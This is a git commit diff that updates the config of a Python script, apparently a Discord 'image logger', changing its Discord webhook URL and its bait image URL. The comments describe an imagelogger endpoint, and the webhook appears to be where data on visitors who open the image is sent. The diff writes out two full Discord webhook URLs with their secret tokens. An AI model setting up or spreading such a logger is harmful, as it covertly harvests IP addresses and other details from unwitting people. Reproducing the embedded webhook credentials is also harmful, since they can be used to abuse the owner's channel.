9ea41fef00f7d2696a73b9d0c9a03f6c84fbf390
megaybi2-a11y <megaybi2@gmail.com>
2026-02-03 15:41:05 +0300

    Update webhook and image URLs in wow.py

--- API/wow.py
+++ API/wow.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1279431553163722924/Lg4Otic0GzzCjBkII4jvUp_RiQx7Y96q448CylDUkksb_PM1v3I9b2vjS5sCRAIqD4Y4",
+    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQOEK0kdRghgEM-sKKDY1uVA1t_2fZ1C8jtMBteTI6M3w&s=10", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
